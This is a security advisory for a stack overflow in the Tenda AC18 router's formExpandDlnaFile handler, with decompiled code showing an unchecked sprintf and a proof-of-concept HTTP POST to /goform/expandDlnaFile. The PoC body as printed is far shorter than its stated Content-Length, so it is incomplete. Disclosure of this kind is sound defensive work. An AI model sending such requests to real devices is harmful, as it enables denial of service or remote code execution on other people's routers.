
## Tenda AC18 stack overflow vulnerability

### 1. Affected version:

V15.03.05.19_multi

### 2. Firmware download address

[https://www.tenda.com.cn/download/detail-2683.html](https://www.tenda.com.cn/download/detail-2683.html)

### 3. Vulnerability details


In function formExpandDlnaFile, the content obtained by the program from the time parameter "filePath" is passed to local_24, and then the local_24 is directly copied into the acStack1092 stack through the sprintf function. 
There is no size check, so there is a stack overflow vulnerability. 
The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.
```c
void formExpandDlnaFile(undefined4 param_1)
{
...
  memset(acStack580,0,0x200);
  memset(acStack1092,0,0x200);
  memset(acStack6212,0,0x1400);
  memset(auStack6468,0,0x100);
  local_44 = 0;
  local_14 = 0;
  local_18 = 0;
  local_1c = 0;
  local_20 = (char *)0x0;
  local_24 = FUN_0002ba8c(param_1,"filePath",&DAT_000f3888);
  local_28 = FUN_0002ba8c(param_1,"folderGrade",&DAT_000f3888);
  GetValue("dlna.db",auStack6468);
  sprintf(acStack1092,"%s/%s","/var/etc/upan",local_24);  //here is overflow
  local_20 = acStack1092;
  while (local_20 = strchr(local_20,0x2f), local_20 != (char *)0x0) {
    local_1c = local_1c + 1;
    local_20 = local_20 + 1;
  }
...
}
```

### 4. Recurring vulnerabilities and POC

```bash
POST /goform/expandDlnaFile HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1467
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/dlna.html?random=0.7639560863840195&
Cookie: password=0d403f6ad9aea37a98da9255140dbf6ebyzcvb

filePath=c:&folderGrade=&subfileList=
```
